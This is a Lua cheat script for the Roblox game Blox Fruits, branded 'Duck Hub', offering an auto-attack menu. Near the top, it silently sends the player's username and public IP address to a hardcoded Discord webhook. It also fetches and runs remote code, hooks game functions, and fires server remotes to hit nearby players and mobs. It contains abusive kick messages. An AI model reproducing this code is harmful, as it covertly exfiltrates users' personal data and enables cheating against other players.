repeat
    wait()
until game:IsLoaded()

if game.PlaceId == 2753915549 then
    World1 = true
elseif game.PlaceId == 4442272183 then
    World2 = true
elseif game.PlaceId == 7449423635 then
    World3 = true
end

game.StarterGui:SetCore(
    "SendNotification",
    {
        Title = "Duck hub",
        Icon = "rbxthumb://type=GamePass&id=944258394&w=150&h=150",
        Text = "Đang Tải",
        Duration = 5
    }
)

-- Webhook Function
function PostWebhook(Url, message)
    local request = http_request or request or HttpPost or syn.request
    local data = request({
        Url = Url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode(message)
    })
    return ""
end

-- Admin Logger
function AdminLoggerMsg()
    local randomColor = math.random(0, 0xFFFFFF)
    local AdminMessage = {
        ["embeds"] = {
            {
                ["title"] = "**Duck Hub**",
                ["description"] = "",
                ["type"] = "rich",
                ["color"] = randomColor, 
                ["fields"] = {
                    {
                        ["name"] = "**Username**",
                        ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "**IP Address**",
                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
                        ["inline"] = false
                    },
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
            }
        }
    }
    return AdminMessage
end

PostWebhook("https://discord.com/api/webhooks/1311724779686072391/SoewtgK6hqu33eTiC7Oro1n2k7dzkLMhDgZF6uED8hQx8M-oicQbi0BYON0HnOT3ScKM", AdminLoggerMsg()) -- Post to admin webhook

-- HWID Check
local bannedHWID = ""

local function checkAndKickPlayer()
    local player = game:GetService("Players").LocalPlayer
    local playerHWID = player.UserId

    if playerHWID == bannedHWID then
        player:Kick("Ngu")
    end
end

checkAndKickPlayer()

if not game:IsLoaded() then game.Loaded:Wait() end

local fask = task 

local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()

local Window = Fluent:CreateWindow({
    Title = "Duck Hub",
    SubTitle = "By UwU ( Duck hub ) - khoanguyen0306#0",
    TabWidth = 110,
    Size = UDim2.fromOffset(480, 320),
    Acrylic = false,
    Theme = "Yellow",
    MinimizeKey = Enum.KeyCode.End
})

local Tabs = {
    infor = Window:AddTab({ Title = "Home", Icon = "" }),
}

local Options = Fluent.Options

-- Screen GUI
local ScreenGui = Instance.new("ScreenGui")
local ImageButton = Instance.new("ImageButton")
local UICorner = Instance.new("UICorner")

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

ImageButton.Parent = ScreenGui
ImageButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ImageButton.BorderSizePixel = 0
ImageButton.Position = UDim2.new(0.120833337, 0, 0.0952890813, 0)
ImageButton.Size = UDim2.new(0, 50, 0, 50)
ImageButton.Draggable = true
ImageButton.Image = "rbxthumb://type=GamePass&id=944258394&w=150&h=150"

UICorner.CornerRadius = UDim.new(0, 10) 
UICorner.Parent = ImageButton

ImageButton.MouseButton1Down:Connect(function()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.End, false, game)
end)

local function playSound()
    local sound = Instance.new("Sound", game:GetService("CoreGui"))
    sound.SoundId = "rbxassetid://130785805"
    sound.Volume = 10
    sound:Play()
end

playSound()

repeat wait() until game.Players
repeat wait() until game.Players.LocalPlayer
repeat wait() until game.ReplicatedStorage
repeat wait() until game.ReplicatedStorage:FindFirstChild("Remotes")
repeat wait() until game.Players.LocalPlayer:FindFirstChild("PlayerGui")
repeat wait() until game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
repeat wait() until game:GetService("Players")
repeat wait() until game:GetService("Players").LocalPlayer.Character:FindFirstChild("Energy")
wait(0.5)

if not game:IsLoaded() then repeat game.Loaded:Wait() until game:IsLoaded() end

if game.PlaceId == 2753915549 then
    World1 = true
elseif game.PlaceId == 4442272183 then
    World2 = true
elseif game.PlaceId == 7449423635 then
    World3 = true
else
    game:GetService("Players").LocalPlayer:Kick(" Con Đĩ Mẹ Mày")
end

hookfunction(require(game:GetService("ReplicatedStorage").Effect.Container.Death), function()end)
hookfunction(require(game:GetService("ReplicatedStorage").Effect.Container.Respawn), function()end)

-- Add Fast Attack functionality
local FASTAT = Tabs.infor:AddToggle("Fast_Attack", {Title = "Fast Attack", Default = true })

FASTAT:OnChanged(function(value)
    if value then
        -- Runs the Fast Attack functionality when toggle is ON
        _G.FastAttack = true

        if _G.FastAttack then
            local _ENV = (getgenv or getrenv or getfenv)()

            local function SafeWaitForChild(parent, childName)
                local success, result = pcall(function()
                    return parent:WaitForChild(childName)
                end)
                if not success or not result then
                    warn("noooooo: " .. childName)
                end
                return result
            end

            local function WaitChilds(path, ...)
                local last = path
                for _, child in {...} do
                    last = last:FindFirstChild(child) or SafeWaitForChild(last, child)
                    if not last then break end
                end
                return last
            end

            local VirtualInputManager = game:GetService("VirtualInputManager")
            local CollectionService = game:GetService("CollectionService")
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local TeleportService = game:GetService("TeleportService")
            local RunService = game:GetService("RunService")
            local Players = game:GetService("Players")
            local Player = Players.LocalPlayer

            if not Player then
                warn("Khổng tìm thấy người chơi cũng bộ.")
                return
            end

            local Remotes = SafeWaitForChild(ReplicatedStorage, "Remotes")
            if not Remotes then return end

            local Validator = SafeWaitForChild(Remotes, "Validator")
            local CommF = SafeWaitForChild(Remotes, "CommF_")
            local CommE = SafeWaitForChild(Remotes, "CommE")

            local ChestModels = SafeWaitForChild(workspace, "ChestModels")
            local WorldOrigin = SafeWaitForChild(workspace, "_WorldOrigin")
            local Characters = SafeWaitForChild(workspace, "Characters")
            local Enemies = SafeWaitForChild(workspace, "Enemies")
            local Map = SafeWaitForChild(workspace, "Map")

            local EnemySpawns = SafeWaitForChild(WorldOrigin, "EnemySpawns")
            local Locations = SafeWaitForChild(WorldOrigin, "Locations")

            local RenderStepped = RunService.RenderStepped
            local Heartbeat = RunService.Heartbeat
            local Stepped = RunService.Stepped

            local Modules = SafeWaitForChild(ReplicatedStorage, "Modules")
            local Net = SafeWaitForChild(Modules, "Net")

            local sethiddenproperty = sethiddenproperty or function(...) return ... end
            local setupvalue = setupvalue or (debug and debug.setupvalue)
            local getupvalue = getupvalue or (debug and debug.getupvalue)

            local Settings = {
                AutoClick = true,
                ClickDelay = 0,
            }

            local Module = {}

            Module.FastAttack = (function()
                if _ENV.rz_FastAttack then
                    return _ENV.rz_FastAttack
                end

                local FastAttack = {
                    Distance = 100,
                    attackMobs = true,
                    attackPlayers = true,
                    Equipped = nil
                }

                local RegisterAttack = SafeWaitForChild(Net, "RE/RegisterAttack")
                local RegisterHit = SafeWaitForChild(Net, "RE/RegisterHit")

                local function IsAlive(character)
                    return character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0
                end

                local function ProcessEnemies(OthersEnemies, Folder)
                    local BasePart = nil
                    for _, Enemy in Folder:GetChildren() do
                        local Head = Enemy:FindFirstChild("Head")
                        if Head and IsAlive(Enemy) and Player:DistanceFromCharacter(Head.Position) < FastAttack.Distance then
                            if Enemy ~= Player.Character then
                                table.insert(OthersEnemies, { Enemy, Head })
                                BasePart = Head
                            end
                        end
                    end
                    return BasePart
                end

                function FastAttack:Attack(BasePart, OthersEnemies)
                    if not BasePart or #OthersEnemies == 0 then return end
                    RegisterAttack:FireServer(Settings.ClickDelay or 0)
                    RegisterHit:FireServer(BasePart, OthersEnemies)
                end

                function FastAttack:AttackNearest()
                    local OthersEnemies = {}
                    local Part1 = ProcessEnemies(OthersEnemies, Enemies)
                    local Part2 = ProcessEnemies(OthersEnemies, Characters)
                    if #OthersEnemies > 0 then
                        self:Attack(Part1 or Part2, OthersEnemies)
                    else
                        task.wait(0)
                    end
                end

                function FastAttack:BladeHits()
                    local Equipped = IsAlive(Player.Character) and Player.Character:FindFirstChildOfClass("Tool")
                    if Equipped and Equipped.ToolTip ~= "Gun" then
                        self:AttackNearest()
                    else
                        task.wait(0)
                    end
                end

                task.spawn(function()
                    while task.wait(Settings.ClickDelay) do
                        if Settings.AutoClick then
                            FastAttack:BladeHits()
                        end
                    end
                end)

                _ENV.rz_FastAttack = FastAttack
                return FastAttack
            end)()
        end

        game.StarterGui:SetCore(
    "SendNotification",
    {
        Title = "Duck hub",
        Icon = "rbxthumb://type=GamePass&id=944258394&w=150&h=150",
        Text = "Fast Attack On",
        Duration = 5
    }
)
    else
        -- Runs when Fast Attack is disabled
        print("Fast Attack Disabled")
        game.StarterGui:SetCore(
            "SendNotification",
            {
                Title = "Duck hub",
                Icon = "rbxthumb://type=GamePass&id=944258394&w=150&h=150",
                Text = "Fast Attack Disabled",
                Duration = 5
            }
        )
        _G.FastAttack = false
    end
end)

